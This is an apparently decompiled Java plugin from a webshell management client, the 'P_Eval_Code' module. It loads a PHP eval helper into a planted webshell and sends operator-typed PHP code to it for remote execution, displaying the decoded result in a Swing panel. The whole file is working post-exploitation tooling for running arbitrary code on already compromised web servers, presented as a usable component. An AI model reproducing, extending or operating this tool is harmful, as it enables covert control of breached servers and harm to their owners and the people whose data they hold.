package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.border.TitledBorder;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginnAnnotation(
   payloadName = "PhpDynamicPayload",
   Name = "P_Eval_Code"
)
public class PhpEvalCode implements Plugin {
   private static final String CLASS_NAME = "PHP_Eval_Code";
   private JPanel panel = new JPanel(new BorderLayout());
   private RTextArea codeTextArea = new RTextArea();
   private JButton runButton = new JButton("Run");
   private RTextArea resultTextArea = new RTextArea();
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;

   public PhpEvalCode() {
      JSplitPane pane1 = new JSplitPane();
      JSplitPane pane2 = new JSplitPane();
      JPanel runButtonPanel = new JPanel(new FlowLayout());
      runButtonPanel.add(this.runButton);
      this.codeTextArea.setBorder(new TitledBorder("code"));
      this.resultTextArea.setBorder(new TitledBorder("result"));
      this.codeTextArea.setText("\necho \"hello word!\";\t\t\t\t\t");
      pane1.setOrientation(1);
      pane1.setLeftComponent(new JScrollPane(this.codeTextArea));
      pane1.setRightComponent(runButtonPanel);
      pane2.setOrientation(1);
      pane2.setLeftComponent(pane1);
      pane2.setRightComponent(new JScrollPane(this.resultTextArea));
      this.panel.add(pane2);
   }

   private void Load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/evalCode.php");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.payload.include("PHP_Eval_Code", data)) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.error("Load fail");
            }
         } catch (Exception var3) {
            Log.error(var3);
         }
      } else {
         JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
      }

   }

   private void runButtonClick(ActionEvent actionEvent) {
      String code = this.codeTextArea.getText();
      if (code != null && code.trim().length() > 0) {
         String resultString = this.eval(code);
         this.resultTextArea.setText(resultString);
      } else {
         JOptionPane.showMessageDialog(this.panel, "code is null", "提示", 2);
      }

   }

   public String eval(String code) {
      return this.eval(code, new ReqParameter());
   }

   public String eval(String code, ReqParameter reqParameter) {
      reqParameter.add("plugin_eval_code", code);
      if (!this.loadState) {
         this.Load();
      }

      String resultString = this.encoding.Decoding(this.payload.evalFunc("PHP_Eval_Code", "xxx", reqParameter));
      return resultString;
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModel();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }
}
